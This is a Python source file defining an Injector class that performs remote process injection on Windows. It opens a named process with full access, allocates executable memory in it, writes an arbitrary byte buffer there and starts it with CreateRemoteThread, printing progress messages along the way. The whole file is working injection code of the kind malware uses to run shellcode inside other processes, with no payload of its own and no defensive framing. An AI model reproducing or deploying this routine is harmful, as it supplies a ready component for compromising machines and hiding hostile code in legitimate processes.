import ctypes
from ctypes import wintypes
from constants.variable import *
from window_api.api import winapi_kernel32
from utility import get_process_id_ex

kernel32 = ctypes.windll.kernel32
WaitForSingleObject = kernel32.WaitForSingleObject
WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
WaitForSingleObject.restype = wintypes.DWORD

class Injector:
    def __init__(self, process_name, source):
        self.process_name = process_name
        self.source = source
        self.handle = None
        self.memory = None
        self.thread = None

    def open_process(self):
        try:
            pid = get_process_id_ex(self.process_name)
        except Exception:
            raise RuntimeError("[*] No found the process")
        else:
            self.handle = winapi_kernel32.OpenProcess(
                PROCESS_ALL_ACCESS,
                False,
                pid
            )
            print("[*] Opened a Handle to the process")

    def virtual_alloc_ex(self):
        self.memory = winapi_kernel32.VirtualAllocEx(
            self.handle,
            None,
            len(self.source),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        print("[*] Allocated Memory in the process")

    def write_process_memory(self):
        written = ctypes.c_size_t()
        winapi_kernel32.WriteProcessMemory(
            self.handle,
            self.memory,
            self.source,
            len(self.source),
            ctypes.byref(written)
        )
        print("[*] Wrote The source to memory")

    def create_remote_thread(self):
        self.thread = winapi_kernel32.CreateRemoteThread(
            self.handle,
            None,
            0,
            self.memory,
            None,
            EXECUTE_IMMEDIATELY,
            None
        )
        WaitForSingleObject(self.thread, 0xFFFFFFFF)
        print("[*] Created a remote thread in target process")

    def cleanup(self):
        if self.thread:
            winapi_kernel32.CloseHandle(self.thread)
            self.thread = None
            print("[*] Closed thread")
        if self.memory:
            winapi_kernel32.VirtualFreeEx(
                self.handle,
                self.memory,
                0,
                MEM_RELEASE
            )
            self.memory = None
            print("[*] Free memory")
        if self.handle:
            winapi_kernel32.CloseHandle(self.handle)
            self.handle = None
            print("[*] Closed process")

    def execute(self):
        print("[*] Injecting...")
        try:
            self.open_process()
            self.virtual_alloc_ex()
            self.write_process_memory()
            self.create_remote_thread()
            print("[*] Injected the source into the process")
        except Exception as error:
            print(f"[-] Catched an error-1: {error}")
        finally:
            self.cleanup()
            print("[*] Free resource")
